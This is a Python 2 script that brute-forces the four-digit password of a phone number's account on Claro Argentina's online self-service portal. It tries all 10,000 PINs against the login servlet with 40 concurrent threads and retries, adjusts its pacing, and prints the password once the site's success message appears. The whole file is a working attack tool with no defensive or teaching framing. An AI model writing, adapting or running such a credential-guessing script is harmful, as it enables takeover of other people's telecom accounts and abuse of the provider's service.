#!/usr/bin/env python
#-*- coding: UTF-8 -*-

import urllib2
import time
import urllib
import cookielib
from debug import debug
import sys
from decoradores import Async, Retry


MAINURL = ("""http://www.servicios.claroargentina.com/"""
            """AutogestionCore2006/servlet/Controller""")

LOGINKEY = """LOGINMAS"""
SALDOKEY = """DATOS_FACTURA"""


@Async
@Retry(15, pause=2)
def login(loginNumber, password):

    data = urllib.urlencode({
        "EVENT": LOGINKEY,
        "loginNumber": loginNumber,
        "password": password,
        })

    try:
        html = "\n".join(urllib2.urlopen(MAINURL, data).readlines())
    except (urllib2.URLError, urllib2.HTTPError):
        return None
    else:
        if """Los datos ingresados son correctos""" in html:
            return password
        elif """El Nro. o Password ingresados son incorrectos""" in html:
            return False
        elif """En este momento no podemos atender tu consulta.""" in html:
            return None
        else:
#            print "error desconocido"
            return None


def main():
    loginNumber = sys.argv[1]

    threads = 40
    pause = .1
    slots = [None] * threads
    for number in xrange(10000):
        password = "%04d" % number 
        #debug("Probando %s" % password)
        passed = False
        tries = 0
        while not passed:
            tries += 1
            for pos in xrange(threads):
                if slots[pos] is None:
                    passed = True
                elif not slots[pos].is_alive():
                    if slots[pos].result:
                        print("¡La contraseña de %s es %s !" % (
                            loginNumber, slots[pos].result))
                        return 0
                    passed = True
                if passed:
                    if not number % 25:
                        if not number % 250:
                            print number / 100,
                        else:
                            sys.stdout.write(".")
                        sys.stdout.flush()
                    slots[pos] = login(loginNumber, password)
                    break
            time.sleep(pause)
        pause *= tries ** 0.2 * .9
        if tries > 10:
            pause = pause * 10 + 0.001


if __name__ == "__main__":
    exit(main())
